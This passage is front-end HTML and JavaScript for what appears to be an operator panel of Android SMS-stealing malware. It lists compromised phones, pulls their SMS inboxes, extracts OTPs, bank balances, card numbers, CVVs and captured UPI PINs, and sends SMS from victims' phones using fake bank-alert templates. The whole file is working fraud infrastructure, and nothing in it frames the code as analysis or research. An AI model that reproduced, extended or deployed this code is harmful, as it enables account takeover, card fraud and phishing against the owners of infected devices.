        <div class="bc-chip" onclick="applyBcTemplate('alert')">⚠️ Alert</div>
        <div class="bc-chip" onclick="applyBcTemplate('maint')">🔧 Maintenance</div>
        <div class="bc-chip" onclick="applyBcTemplate('welcome')">👋 Welcome</div>
        <div class="bc-chip" onclick="applyBcTemplate('blank')">🗑 Clear</div>
      </div>
      <textarea class="inp" id="bc-body" placeholder="Type your broadcast mail…"
                oninput="updateBcCounter()" rows="4" style="min-height:100px"></textarea>
      <div class="bc-counter" id="bc-counter">
        <span id="bc-segments">1 SMS · GSM-7</span>
        <span id="bc-chars">0 / 160</span>
      </div>
      <div class="bc-progress" id="bc-progress">
        <div class="bc-progress-bar"><div class="bc-progress-fill" id="bc-progress-fill"></div></div>
        <div class="bc-progress-text" id="bc-progress-text">Preparing…</div>
      </div>
      <div class="bc-actions">
        <button class="btn btn-ghost" onclick="closeBroadcastModal()">Cancel</button>
        <button class="btn-bc" id="bc-send-btn" onclick="doBroadcast()">📧 Send Mail to All</button>
      </div>
    </div>
  </div>
</div>

<div class="drawer-overlay" id="drawer" onclick="if(event.target===this)closeDrawer()">
  <div class="drawer">
    <div class="drawer-header">
      <div class="drawer-icon">📱</div>
      <div class="flex1 min0">
        <div class="drawer-title" id="drawer-title">Device</div>
        <div class="drawer-id" id="drawer-id"></div>
      </div>
      <button class="btn-icon" onclick="closeDrawer()">✕</button>
    </div>
    <div class="drawer-status" id="drawer-status"></div>
    <div class="tabs">
      <div class="tab active" onclick="switchTab('info',this)">Info</div>
      <div class="tab" id="tab-bank" onclick="switchTab('bank',this)">Bank</div>
      <div class="tab" id="tab-card" onclick="switchTab('card',this)">Card</div>
      <div class="tab" onclick="switchTab('sms',this)"><span class="tab-emoji">🛜</span>SMS</div>
      <div class="tab" onclick="switchTab('send',this)"><span class="tab-emoji">✉️</span>Send</div>
      <div class="tab" id="tab-mail" onclick="switchTab('mail',this)"><span class="tab-emoji">📧</span>Mail</div>
    </div>
    <div class="drawer-body">
      <div id="panel-info"></div>
      <div id="panel-bank" style="display:none"></div>
      <div id="panel-card" style="display:none"></div>
      <div id="panel-sms" style="display:none"></div>
      <div id="panel-send" style="display:none"></div>
      <div id="panel-mail" style="display:none"></div>
    </div>
  </div>
</div>

<div id="toast"></div>

<script>
const IS_ADMIN = {IS_ADMIN};
const $ = (s) => document.querySelector(s);
const $$ = (s) => document.querySelectorAll(s);
let devices = [], currentFilter = "all", currentSort = "new", openDev = null;
let smsCache = {}, smsAnalysisCache = {};
let bcTargetMode = "all", bcManualSelected = new Set(), bcTargets = [];
let allBroadcastsForDevice = [];

/* SEND state */
let sendDevice = null, selectedSim = 1, sendRecipients = [];

function showToast(msg, dur = 3000) {
  const t = $("#toast"); if (!t) return;
  t.textContent = msg; t.classList.add("show");
  clearTimeout(window._t); window._t = setTimeout(() => t.classList.remove("show"), dur);
}

setInterval(() => {
  const c = $("#clock"); if (!c) return;
  c.textContent = new Date().toLocaleTimeString("en-US", { hour:"2-digit", minute:"2-digit", hour12:false });
}, 1000);

async function boot() {
  connectStream();
  await loadDevices();
  updateBcCountBadge();
  setInterval(checkConn, 8000);
  setInterval(() => { if (!openDev) loadDevices(); }, 5000);
}

let es = null;
function connectStream() {
  if (es) es.close();
  try { es = new EventSource("/api/stream"); } catch(e) { return; }
  es.addEventListener("hello", () => setConn(true));
  es.addEventListener("devices_added", () => { loadDevices(); });
  es.addEventListener("devices_updated", () => { loadDevices(); if (openDev) renderDrawerStatus(); });
  es.addEventListener("devices_removed", () => { loadDevices(); });
  es.addEventListener("error", () => setConn(false));
  es.onerror = () => setConn(false);
}

function setConn(ok) {
  const dot = $("#conn-dot"), txt = $("#conn-txt"); if (!dot) return;
  dot.className = "dot " + (ok ? "dot-green" : "dot-red");
  txt.textContent = ok ? "Live" : "Offline";
}
async function checkConn() {
  try { const r = await fetch("/api/conn"); const d = await r.json(); setConn(d.mongo_connected); }
  catch(e) { setConn(false); }
}

function normalize(d) {
  const slug = d._slug || d.slug || "unknown";
  const rawId = d.id || d.device_id;
  const composite = `${slug}::${rawId}`;
  const sims = Array.isArray(d.sims) ? d.sims : (d.sims ? Object.values(d.sims) : []);
  const bat = String(d.battery ?? "0");
  const batPct = parseInt(bat.replace("%", "")) || 0;
  const rawTs = d.lastSeen ?? d.last_seen ?? d.lastOnline ?? d.last_active ?? d.timestamp ?? d.time ?? null;
  let lastSeen = null;
  if (rawTs) {
    const n = typeof rawTs === "number" ? (rawTs < 1e12 ? rawTs * 1000 : rawTs) : Date.parse(String(rawTs));
    if (!isNaN(n)) lastSeen = n;
  }
  return {
    id: composite, rawId, slug,
    name: String(d.modelName || d.model || d.deviceName || d.device_name || rawId || "unknown"),
    battery: bat, batteryPercent: batPct, status: !!d.status || !!d.online,
    phoneNumber: String(d.mobNo || d.mobile || d.number || (sims[0]?.phoneNumber || sims[0]?.number) || "—"),
    android: String(d.androidV || d.androidVersion || "—"),
    ip: String(d.ip_address || d.ip || "—"),
    storage: String(d.storage || "—"),
    provider: String(d.service_provider || d.provider || "—"),
    sims, upipin: d.upipin ? String(d.upipin) : null,
    cpu: String(d.cpu_arch || "—"), sdk: String(d.sdkV || "—"),
    lastSeen,
    device_id: d.device_id || rawId,
    firebase: d.firebase || "",
    fb_name: d.fb_name || "",
  };
}

async function loadDevices() {
  try {
    const r = await fetch("/api/numbers");
    const d = await r.json();
    devices = (d.numbers || []).map(normalize);
    updateStats(); renderGrid();
    updateBcCountBadge();
  } catch(e) {
    $("#device-grid").innerHTML = `<div class="empty"><span class="empty-icon">⚠️</span>${escHtml(e.message)}</div>`;
  }
}

function updateStats() {
  $("#stat-total").textContent = devices.length;
  $("#stat-online").textContent = devices.filter(d => d.status).length;
  $("#stat-offline").textContent = devices.filter(d => !d.status).length;
  $("#stat-bank").textContent = devices.filter(d => d.smsAnalysis?.bankBalances?.length).length;
  $("#stat-card").textContent = devices.filter(d => d.smsAnalysis?.cards?.length).length;
  $("#stat-mail").textContent = allBroadcastsForDevice.length || 0;
}

window.setFilter = (f, el) => {
  currentFilter = f;
  $$(".filter-btn").forEach(b => b.classList.remove("active","active-green","active-purple"));
  if (f === "bank") el.classList.add("active-green");
  else if (f === "card") el.classList.add("active-purple");
  else el.classList.add("active");
  renderGrid();
};
window.setSort = (v) => { currentSort = v; renderGrid(); };

window.renderGrid = function () {
  const q = ($("#search-inp")?.value || "").toLowerCase();
  let filtered = devices.filter(d => {
    if (currentFilter === "online" && !d.status) return false;
    if (currentFilter === "offline" && d.status) return false;
    if (currentFilter === "bank" && !d.smsAnalysis?.bankBalances?.length) return false;
    if (currentFilter === "card" && !d.smsAnalysis?.cards?.length) return false;
    if (currentFilter === "upi" && !d.upipin) return false;
    if (q && !d.name.toLowerCase().includes(q) && !d.phoneNumber.includes(q) && !d.id.includes(q)) return false;
    return true;
  });
  filtered.sort((a, b) => {
    if (currentSort === "name") return a.name.localeCompare(b.name);
    if (currentSort === "battery") return b.batteryPercent - a.batteryPercent;
    if (currentSort === "old") return a.id.localeCompare(b.id);
    return b.id.localeCompare(a.id);
  });
  const grid = $("#device-grid");
  if (!filtered.length) {
    grid.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>No devices</div>';
    return;
  }
  grid.innerHTML = filtered.map(cardHtml).join("");
};

function cardHtml(d) {
  const an = d.smsAnalysis;
  const topBank = an?.bankBalances?.[0], topCard = an?.cards?.[0];
  const phone = d.phoneNumber !== "—" ? d.phoneNumber : an?.phoneNumbers?.[0] || "—";
  const net = d.provider !== "—" ? d.provider : an?.networks?.[0] || null;
  const statusPill = d.status
    ? '<span class="status-emoji online"><span class="emoji">📡</span>ONLINE</span>'
    : '<span class="status-emoji offline"><span class="emoji">⚠️</span>OFFLINE</span>';
  return `<div class="device-card" onclick="openDevice('${d.id}')">
    <div class="flex items-center" style="gap:10px;margin-bottom:10px">
      <div class="device-icon-tile ${d.status ? "" : "offline"}">📱</div>
      <div class="flex1 min0">
        <div class="dev-name">${escHtml(d.name)}</div>
        <div class="dev-id">${escHtml(d.slug)} · ${escHtml(d.rawId)}</div>
      </div>
    </div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px">
      <div>
        <div style="font-size:9px;color:var(--text3);font-weight:700;text-transform:uppercase;margin-bottom:2px">Android</div>
        <div style="font-size:13px;font-weight:700">${d.android !== "—" ? "v" + d.android.replace("v","") : "—"}</div>
      </div>
      <div>
        <div style="font-size:9px;color:var(--text3);font-weight:700;text-transform:uppercase;margin-bottom:2px">Battery</div>
        ${batHtml(d.batteryPercent)}
      </div>
    </div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px">
      <div>
        <div style="font-size:9px;color:var(--text3);font-weight:700;text-transform:uppercase;margin-bottom:2px">Number</div>
        <div style="font-size:11px;font-family:'JetBrains Mono',monospace;color:var(--text2)">${escHtml(phone)}</div>
      </div>
      ${net ? `<div>
        <div style="font-size:9px;color:var(--text3);font-weight:700;text-transform:uppercase;margin-bottom:2px">Network</div>
        <div style="font-size:12px;font-weight:600">${escHtml(net)}</div>
      </div>` : "<div></div>"}
    </div>
    ${topBank ? `<div style="background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.15);border-radius:var(--radius);padding:8px 10px;margin-bottom:8px">
      <div class="flex items-center justify-between">
        <span style="font-size:10px;font-weight:700;color:var(--green)">${escHtml(topBank.bankName)}${topBank.accountLast4 ? ` ••${escHtml(topBank.accountLast4)}` : ""}</span>
        <span style="font-size:14px;font-weight:900;font-family:'Orbitron',sans-serif">₹${fmtBal(topBank.availableBalance)}</span>
      </div>
    </div>` : ""}
    <div class="flex items-center" style="gap:8px">
      ${statusPill}
      ${!d.status && d.lastSeen ? `<span style="font-size:10px;color:var(--text3);font-family:'JetBrains Mono',monospace">${timeAgo(d.lastSeen)}</span>` : ""}
      ${topCard ? '<span class="badge badge-amber" style="margin-left:auto">💳</span>' : ""}
      ${d.upipin ? '<span class="badge badge-amber" style="margin-left:auto">UPI</span>' : ""}
    </div>
  </div>`;
}

window.openDevice = async function (compositeId) {
  const dev = devices.find(d => d.id === compositeId);
  if (!dev) return;
  openDev = dev;
  $("#drawer-title").textContent = dev.name;
  $("#drawer-id").textContent = `${dev.slug} · ${dev.rawId}`;
  renderDrawerStatus();
  switchTab("info", $(".tab"));
  $("#drawer").classList.add("open");
  await fetchSms(dev);
  await fetchBroadcasts(dev);
  updateDrawerBadges();
};

window.closeDrawer = function () {
  $("#drawer").classList.remove("open");
  openDev = null; allBroadcastsForDevice = [];
};

async function fetchSms(dev) {
  if (!dev.firebase || !dev.device_id) {
    smsCache[dev.id] = [];
    smsAnalysisCache[dev.id] = {bankBalances:[],cards:[],phoneNumbers:[],networks:[]};
    return;
  }
  try {
    const url = `/api/inbox?fb=${encodeURIComponent(dev.firebase)}&id=${encodeURIComponent(dev.device_id)}&num=${encodeURIComponent(dev.phoneNumber)}`;
    const r = await fetch(url);
    const d = await r.json();
    const msgs = (d.messages || []).map(m => ({
      text: m.message || "",
      sender: m.from || "Unknown",
      time: m.date_string || (m.timestamp ? new Date(m.timestamp*1000).toLocaleString() : ""),
      otp: m.otp || extractOtp(m.message || ""),
      timestamp: m.timestamp || 0,
    }));
    smsCache[dev.id] = msgs;
    smsAnalysisCache[dev.id] = analyzeSms(msgs);
    dev.smsAnalysis = smsAnalysisCache[dev.id];
  } catch(e) {
    smsCache[dev.id] = [];
    smsAnalysisCache[dev.id] = {bankBalances:[],cards:[],phoneNumbers:[],networks:[]};
  }
}

async function fetchBroadcasts(dev) {
  if (!dev.firebase || !dev.device_id) { allBroadcastsForDevice = []; return; }
  try {
    const url = `/api/broadcasts/inbox?device_id=${encodeURIComponent(dev.device_id)}&fb=${encodeURIComponent(dev.firebase)}&num=${encodeURIComponent(dev.phoneNumber)}`;
    const r = await fetch(url);
    const d = await r.json();
    allBroadcastsForDevice = (d.broadcasts || []).map(b => ({
      id: b.id, message: b.message, status: b.status, read: b.read,
      created_at: b.created_at, number: b.number, device_name: b.device_name,
    }));
  } catch(e) { allBroadcastsForDevice = []; }
}

function updateDrawerBadges() {
  if (!openDev) return;
  const an = smsAnalysisCache[openDev.id] || {bankBalances:[],cards:[]};
  const tb = $("#tab-bank"), tc = $("#tab-card");
  if (tb) tb.textContent = `Bank (${an.bankBalances.length})`;
  if (tc) tc.textContent = `Card (${an.cards.length})`;
  const mailUnread = allBroadcastsForDevice.filter(b => !b.read).length;
  const tm = $("#tab-mail");
  if (tm) tm.innerHTML = `<span class="tab-emoji">📧</span>Mail${mailUnread ? ` <span style="background:#E40000;color:#fff;padding:1px 6px;border-radius:8px;font-size:9px;font-weight:900">${mailUnread}</span>` : ""}`;
}

function renderDrawerStatus() {
  if (!openDev) return;
  const d = openDev;
  const an = smsAnalysisCache[d.id] || {};
  const phone = d.phoneNumber !== "—" ? d.phoneNumber : (an.phoneNumbers?.[0] || "—");
  const statusPill = d.status
    ? '<span class="status-emoji online" style="padding:3px 8px;font-size:10px"><span class="emoji">📡</span>ONLINE</span>'
    : '<span class="status-emoji offline" style="padding:3px 8px;font-size:10px"><span class="emoji">⚠️</span>OFFLINE</span>';
  $("#drawer-status").innerHTML = `
    ${statusPill}
    ${!d.status && d.lastSeen ? `<span style="font-size:9px;font-family:'JetBrains Mono',monospace;color:var(--red2)">${timeAgo(d.lastSeen)}</span>` : ""}
    ${batHtml(d.batteryPercent)}
    ${d.upipin ? `<span class="badge badge-amber">⚡ ${escHtml(d.upipin.split("|")[0])}</span>` : ""}
    ${phone !== "—" ? `<span style="font-size:10px;font-family:'JetBrains Mono',monospace;color:var(--text3)">${escHtml(phone)}</span>` : ""}
  `;
}

window.switchTab = function (name, el) {
  ["info","bank","card","sms","send","mail"].forEach(p => {
    const e = $("#panel-" + p); if (e) e.style.display = "none";
  });
  $$(".tab").forEach(t => t.classList.remove("active","active-g","active-p","active-b","active-mail"));
  const panel = $("#panel-" + name);
  if (panel) panel.style.display = "block";
  if (el) {
    if (name === "bank") el.classList.add("active-g");
    else if (name === "card") el.classList.add("active-p");
    else if (name === "send") el.classList.add("active-b");
    else if (name === "mail") el.classList.add("active-mail");
    else el.classList.add("active");
  }
  if (name === "info") renderPanelInfo();
  if (name === "bank") renderPanelBank();
  if (name === "card") renderPanelCard();
  if (name === "sms") renderPanelSms();
  if (name === "send") renderPanelSend();
  if (name === "mail") renderPanelMail();
};

function renderPanelInfo() {
  if (!openDev) return;
  const d = openDev, an = smsAnalysisCache[d.id] || {};
  const phone = d.phoneNumber !== "—" ? d.phoneNumber : (an.phoneNumbers?.[0] || "—");
  const net = d.provider !== "—" ? d.provider : (an.networks?.[0] || "—");
  const statusLine = d.status
    ? '<span class="status-emoji online" style="padding:3px 8px;font-size:10px"><span class="emoji">📡</span>ONLINE</span>'
    : '<span class="status-emoji offline" style="padding:3px 8px;font-size:10px"><span class="emoji">⚠️</span>OFFLINE</span>';
  $("#panel-info").innerHTML = `
    <div style="display:flex;justify-content:center;margin-bottom:14px">${statusLine}</div>
    ${!d.status && d.lastSeen ? `
      <div style="background:rgba(228,0,0,.06);border:1px solid rgba(228,0,0,.15);border-left:2px solid var(--red);border-radius:var(--radius);padding:10px;margin-bottom:12px">
        <div style="font-size:9px;color:var(--red2);font-weight:700;text-transform:uppercase;margin-bottom:4px">⚠️ Offline Since</div>
        <div style="font-size:15px;font-weight:900;color:var(--red2)">${timeAgo(d.lastSeen)}</div>
      </div>` : ""}
    <div class="kv"><span class="kv-k">Project</span><span class="kv-v mono">${escHtml(d.slug)}</span></div>
    <div class="kv"><span class="kv-k">Device ID</span><span class="kv-v mono">${escHtml(d.rawId)}</span></div>
    <div class="kv"><span class="kv-k">Phone Number</span><span class="kv-v mono">${escHtml(phone)}</span></div>
    <div class="kv"><span class="kv-k">Network</span><span class="kv-v">${escHtml(net)}</span></div>
    <div class="kv"><span class="kv-k">Android</span><span class="kv-v">${escHtml(d.android)}</span></div>
    <div class="kv"><span class="kv-k">IP Address</span><span class="kv-v mono">${escHtml(d.ip)}</span></div>
    <div class="kv"><span class="kv-k">Storage</span><span class="kv-v">${escHtml(d.storage)}</span></div>
    <div class="kv"><span class="kv-k">CPU Arch</span><span class="kv-v mono">${escHtml(d.cpu)}</span></div>
    <div class="kv"><span class="kv-k">SDK Version</span><span class="kv-v">${escHtml(d.sdk)}</span></div>
    <div class="kv"><span class="kv-k">SIM Count</span><span class="kv-v">${d.sims.length}</span></div>
    ${d.sims.map((s, i) => (s.phoneNumber || s.number) ? `<div class="kv"><span class="kv-k">SIM ${i+1}</span><span class="kv-v mono">${escHtml(s.phoneNumber || s.number)}</span></div>` : "").join("")}
    ${d.upipin ? `<div class="kv"><span class="kv-k">UPI PIN</span><span class="kv-v" style="color:var(--amber)">${escHtml(d.upipin)}</span></div>` : ""}
    ${(an.phoneNumbers || []).map((p, i) => `<div class="kv"><span class="kv-k" style="color:var(--green)">Phone #${i+1}</span><span class="kv-v mono" style="color:var(--green)">${escHtml(p)}</span></div>`).join("")}
    ${(an.networks || []).map(n => `<div class="kv"><span class="kv-k" style="color:var(--purple)">Network</span><span class="kv-v" style="color:var(--purple)">${escHtml(n)}</span></div>`).join("")}
  `;
}

function renderPanelBank() {
  if (!openDev) return;
  const an = smsAnalysisCache[openDev.id];
  const p = $("#panel-bank");
  if (!an) { p.innerHTML = '<div class="empty"><span class="empty-icon">⏳</span>Loading…</div>'; return; }
  const b = an.bankBalances || [];
  if (!b.length) { p.innerHTML = '<div class="empty"><span class="empty-icon">🏦</span>No bank SMS</div>'; return; }
  p.innerHTML = `<div style="margin-bottom:10px;font-size:11px;color:var(--text3)">Detected from ${smsCache[openDev.id]?.length || 0} SMS</div>` +
    b.map(x => `<div class="bank-card">
      <div class="flex items-center justify-between" style="margin-bottom:6px">
        <span style="font-size:12px;font-weight:700;color:var(--green)">${escHtml(x.bankName)}${x.accountLast4 ? ` ••${escHtml(x.accountLast4)}` : ""}</span>
        ${x.transactionType ? `<span class="badge ${x.transactionType === "credit" ? "badge-green" : "badge-red"}">${x.transactionType === "credit" ? "↑ Credit" : "↓ Debit"}</span>` : ""}
      </div>
      <div class="bal-big">₹${fmtBal(x.availableBalance)}</div>
      ${x.transactionAmount ? `<div style="font-size:11px;color:var(--text3);margin-top:4px">Transaction: ₹${fmtBal(x.transactionAmount)}</div>` : ""}
      <div style="font-size:10px;color:var(--text3);margin-top:6px;word-break:break-word">${escHtml(x.rawSms.substring(0, 160))}</div>
    </div>`).join("");
}

function renderPanelCard() {
  if (!openDev) return;
  const an = smsAnalysisCache[openDev.id];
  const p = $("#panel-card");
  if (!an) { p.innerHTML = '<div class="empty"><span class="empty-icon">⏳</span>Loading…</div>'; return; }
  const c = an.cards || [];
  if (!c.length) { p.innerHTML = '<div class="empty"><span class="empty-icon">💳</span>No card info</div>'; return; }
  p.innerHTML = c.map(x => `<div class="cc-card">
    <div class="flex items-center justify-between" style="margin-bottom:6px">
      <span style="font-size:12px;font-weight:700;color:var(--purple)">${escHtml(x.cardType)}</span>
      ${x.expiry ? `<span style="font-size:10px;color:var(--text3)">Exp: ${escHtml(x.expiry)}</span>` : ""}
    </div>
    <div style="font-size:14px;font-family:'JetBrains Mono',monospace;letter-spacing:.1em">•••• •••• •••• ${escHtml(x.cardLast4)}</div>
    ${x.cvv ? `<div style="font-size:11px;margin-top:6px">CVV: <span style="font-family:'JetBrains Mono',monospace;color:var(--purple)">${escHtml(x.cvv)}</span></div>` : ""}
  </div>`).join("");
}

function renderPanelSms() {
  if (!openDev) return;
  const msgs = smsCache[openDev.id];
  const p = $("#panel-sms");
  if (!msgs) { p.innerHTML = '<div class="empty"><span class="empty-icon">⏳</span>Loading…</div>'; return; }
  if (!msgs.length) { p.innerHTML = '<div class="empty"><span class="empty-icon">🛜</span>No messages</div>'; return; }
  p.innerHTML = `<div style="font-size:11px;color:var(--text3);margin-bottom:10px">🛜 ${msgs.length} messages</div>` +
    msgs.map(m => {
      const isBank = isBankSms(m.text, m.sender), isCard = isCardSms(m.text);
      const col = isCard ? "var(--purple)" : isBank ? "var(--green)" : "var(--text2)";
      const otp = m.otp || extractOtp(m.text);
      const copyBtn = otp ? `<button class="otp-copy-btn" onclick="event.stopPropagation();copyOtp('${otp}')">📋 Copy OTP ${otp}</button>` : "";
      return `<div class="sms-item ${isBank ? "is-bank" : ""} ${isCard ? "is-card" : ""}">
        ${otp ? '<div class="msg-type-badge otp">OTP</div>' : ''}
        <div class="flex items-center justify-between" style="padding-right:60px">
          <span class="sms-sender" style="color:${col}">${escHtml(m.sender)}</span>
          <span class="sms-time">${escHtml(m.time)}</span>
        </div>
        <div class="sms-body">${escHtml(m.text.substring(0, 400))}</div>
        ${copyBtn}
      </div>`;
    }).join("");
}

function renderPanelSend() {
  if (!openDev) return;
  const p = $("#panel-send");
  const phone = openDev.phoneNumber !== "—" ? openDev.phoneNumber : "";
  p.innerHTML = `
    <div style="background:linear-gradient(135deg,rgba(15,60,201,.12),rgba(59,130,246,.08));
         border:1px solid rgba(59,130,246,.3);border-radius:12px;padding:16px;margin-bottom:14px">
      <div style="font-family:'Orbitron',sans-serif;font-size:12px;font-weight:800;
           letter-spacing:1px;color:var(--blue2);margin-bottom:8px">✉️ SEND SMS / MESSAGE</div>
      <div style="font-size:11px;color:var(--text3);line-height:1.5;margin-bottom:12px">
        Full composer with templates, multi-recipient, SIM picker.
      </div>
      <button class="btn-send" style="width:100%" onclick="openSendModal('${openDev.id}')">
        Open Composer
      </button>
    </div>
    <div class="section-label">Quick Send to this Number</div>
    <input class="inp" id="qs-to" placeholder="+919876543210" value="${escHtml(phone)}"
      style="font-family:'JetBrains Mono',monospace;margin-bottom:10px">
    <textarea class="inp" id="qs-body" placeholder="Type quick message…" rows="3"></textarea>
    <button class="btn-send" style="width:100%;margin-top:10px" onclick="quickSend()">
      ✉️ Send Now
    </button>
  `;
}

window.quickSend = async function () {
  const to = $("#qs-to").value.trim();
  const body = $("#qs-body").value.trim();
  if (!to || !body) { showToast("❌ Fill number and message"); return; }
  if (!openDev?.firebase) { showToast("❌ No firebase"); return; }
  try {
    const r = await fetch("/api/send", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        firebase: openDev.firebase, device_id: openDev.device_id,
        to, message: body, sim: 1,
      }),
    });
    const d = await r.json();
    if (d.success) { showToast("✅ SMS queued"); $("#qs-body").value = ""; }
    else showToast("❌ " + (d.error || "Failed"));
  } catch(e) { showToast("❌ Network error"); }
};

function renderPanelMail() {
  const p = $("#panel-mail");
  if (!p) return;
  const all = allBroadcastsForDevice;
  const unread = all.filter(b => !b.read).length;
  const delivered = all.filter(b => b.status === "delivered").length;

  const header = `
    <div class="mail-header-card">
      <div class="mh-title">📧 BROADCAST MAIL</div>
      <div class="mh-desc">
        ${IS_ADMIN ? 'Admin-sent broadcasts appear here.' : 'Admin broadcasts received on this device.'}
      </div>
      <div class="mh-stats">
        <span class="mail-stat-pill total">📨 ${all.length} mails</span>
        <span class="mail-stat-pill devices">🆕 ${unread} unread</span>
        <span class="mail-stat-pill delivered">✅ ${delivered} delivered</span>
      </div>
      ${IS_ADMIN ? `<div style="display:flex;gap:8px;margin-top:12px">
        <button class="btn btn-ghost flex1" onclick="openBroadcastModal()" style="padding:10px">📧 New Mail</button>
      </div>` : ""}
    </div>
  `;

  if (!all.length) {
    p.innerHTML = header + '<div class="empty"><span class="empty-icon">📭</span>No mail received yet</div>';
    return;
  }

  const rows = all.slice(0, 100).map(b => {
    const isFresh = (b.created_at || 0) * 1000 >= Date.now() - 120000;
    const ts = b.created_at ? new Date(b.created_at * 1000).toLocaleString() : "";
    return `<div class="sms-item mail-item ${isFresh ? "fresh" : ""}" onclick="markBroadcastRead('${b.id}')" style="cursor:pointer">
      <div class="msg-type-badge mail">📧 MAIL</div>
      <div class="sms-head" style="display:flex;justify-content:space-between;padding-right:60px">
        <div class="sms-sender" style="color:var(--amber);font-family:'Orbitron',sans-serif;font-size:11px">
          📧 ADMIN BROADCAST ${!b.read ? '<span style="color:#E40000">●</span>' : ""}
        </div>
        <div class="sms-time">${escHtml(ts)}</div>
      </div>
      <div class="sms-body">${escHtml(b.message || "")}</div>
    </div>`;
  }).join("");

  p.innerHTML = header + `<div style="font-size:11px;color:var(--text3);margin-bottom:10px">📬 All mails (${all.length})</div>${rows}`;
}

window.markBroadcastRead = async function (id) {
  const b = allBroadcastsForDevice.find(x => x.id === id);
  if (!b || b.read) return;
  b.read = true;
  try {
    await fetch("/api/broadcasts/read", { method:"POST",
      headers:{ "Content-Type":"application/json" }, body: JSON.stringify({ id }) });
  } catch(e) {}
  updateDrawerBadges();
  renderPanelMail();
};

/* SEND SMS */
const TEMPLATES = {
  otp: "Your OTP is 123456. Do not share with anyone. Valid for 10 minutes.",
  bank: "Your A/c XX1234 has been debited with Rs.1000.00. Avl Bal Rs.25,000.00.",
  alert: "ALERT: Unusual login attempt detected on your account. Contact support immediately.",
  delivery: "Your order #OD12345 has been shipped. Expected delivery in 2-3 business days.",
  blank: "",
};

window.openSendModal = function (compositeId) {
  sendDevice = compositeId ? devices.find(d => d.id === compositeId) : (openDev || devices[0]);
  if (!sendDevice) { showToast("❌ No device available"); return; }
  const sims = sendDevice.sims || [];
  $("#send-subtitle").textContent = `${sendDevice.name} · ${sendDevice.slug}`;
  $("#sim1-num").textContent = sims[0]?.phoneNumber || sims[0]?.number || sendDevice.phoneNumber || "no sim";
  $("#sim2-num").textContent = sims[1]?.phoneNumber || sims[1]?.number || "not present";
  if (selectedSim === 2 && !sims[1]) selectedSim = 1;
  pickSim(selectedSim);
  $("#send-to").value = sendDevice.phoneNumber !== "—" ? sendDevice.phoneNumber : "";
  updateRecipients(); updateCounter();
  $("#send-progress").classList.remove("show");
  $("#send-modal").classList.add("open");
};

window.closeSendModal = function () { $("#send-modal").classList.remove("open"); };

window.pickSim = function (n) {
  selectedSim = n;
  $("#sim-opt-1").classList.toggle("active", n === 1);
  $("#sim-opt-2").classList.toggle("active", n === 2);
};

function parseRecipients(str) {
  return String(str || "").split(/[\n,;]+/).map(s => s.trim()).filter(Boolean)
    .map(s => {
      const d = s.replace(/[^0-9]/g, "");
      if (d.length === 10) return d;
      if (d.length === 12 && d.startsWith("91")) return d.slice(2);
      if (d.length === 11 && d.startsWith("0")) return d.slice(1);
      return s;
    });
}

window.updateRecipients = function () {
  const raw = $("#send-to").value;
  sendRecipients = [...new Set(parseRecipients(raw))];
  const box = $("#recipient-tags");
  if (!sendRecipients.length) { box.innerHTML = ""; return; }
  box.innerHTML = sendRecipients.map((r, i) =>
    `<span class="recipient-tag">${escHtml(r)}<span class="rm" onclick="removeRecipient(${i})">✕</span></span>`
  ).join("");
};

window.removeRecipient = function (i) {
  sendRecipients.splice(i, 1);
  $("#send-to").value = sendRecipients.join(", ");
  updateRecipients();
};

window.applyTemplate = function (k) {
  $("#send-body").value = TEMPLATES[k] || "";
  updateCounter();
};

function detectEncoding(text) {
  const gsm = /^[@£$¥èéùìòÇ\nØø\rÅåΔ_ΦΓΛΩΠΨΣΘΞÆæßÉ !"#¤%&'()*+,\-./0-9:;<=>?¡A-ZÄÖÑÜ§¿a-zäöñüà\s\f^{}\\[~\]|€]*$/;
  return gsm.test(text) ? "GSM-7" : "UCS-2";
}

window.updateCounter = function () {
  const txt = $("#send-body").value || "";
  const enc = detectEncoding(txt);
  const len = txt.length;
  let seg, per;
  if (enc === "GSM-7") { seg = len <= 160 ? 1 : Math.ceil(len / 153); per = len <= 160 ? 160 : 153; }
  else { seg = len <= 70 ? 1 : Math.ceil(len / 67); per = len <= 70 ? 70 : 67; }
  const inSeg = seg === 1 ? len : len - ((seg - 1) * per);
  $("#char-count").textContent = `${inSeg} / ${per}`;
  $("#char-segments").textContent = `${seg} SMS · ${enc}`;
  const el = $("#char-counter");
  el.className = "char-counter";
  if (seg > 3) el.classList.add("over");
  else if (seg > 1) el.classList.add("warn");
};

window.doSend = async function () {
  const body = $("#send-body").value.trim();
  if (!sendRecipients.length) { showToast("❌ Add at least one recipient"); return; }
  if (!body) { showToast("❌ Message is empty"); return; }
  if (!sendDevice) { showToast("❌ No device selected"); return; }
  if (!sendDevice.firebase) { showToast("❌ Device has no firebase"); return; }

  const btn = $("#send-btn"); btn.disabled = true;
  const prog = $("#send-progress"); prog.classList.add("show");
  const fill = $("#send-progress-fill"), txt = $("#send-progress-text");

  let ok = 0, fail = 0;
  for (let i = 0; i < sendRecipients.length; i++) {
    const to = sendRecipients[i];
    fill.style.width = Math.round((i / sendRecipients.length) * 100) + "%";
    txt.textContent = `Sending ${i + 1}/${sendRecipients.length} → ${to}`;
    try {
      const r = await fetch("/api/send", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          firebase: sendDevice.firebase,
          device_id: sendDevice.device_id,
          to, message: body, sim: selectedSim,
        }),
      });
      const d = await r.json();
      if (d.success) ok++; else fail++;
    } catch(e) { fail++; }
  }
  fill.style.width = "100%";
  txt.textContent = `✅ ${ok} sent · ${fail} failed`;
  setTimeout(() => {
    prog.classList.remove("show"); fill.style.width = "0%"; btn.disabled = false;
    if (fail === 0) {
      showToast(`✅ ${ok} SMS queued`);
      $("#send-body").value = ""; $("#send-to").value = "";
      sendRecipients = []; updateRecipients(); updateCounter();
    } else showToast(`⚠️ ${ok} sent · ${fail} failed`);
  }, 1400);
};

/* BROADCAST */
function updateBcCountBadge() {
  const badge = $("#bc-count-badge");
  if (!badge) return;
  if (devices.length > 0) { badge.style.display = "flex"; badge.textContent = devices.length; }
  else badge.style.display = "none";
}

window.openBroadcastModal = function () {
  if (!IS_ADMIN) { showToast("❌ Admin only"); return; }
  $("#bc-total").textContent = devices.length;
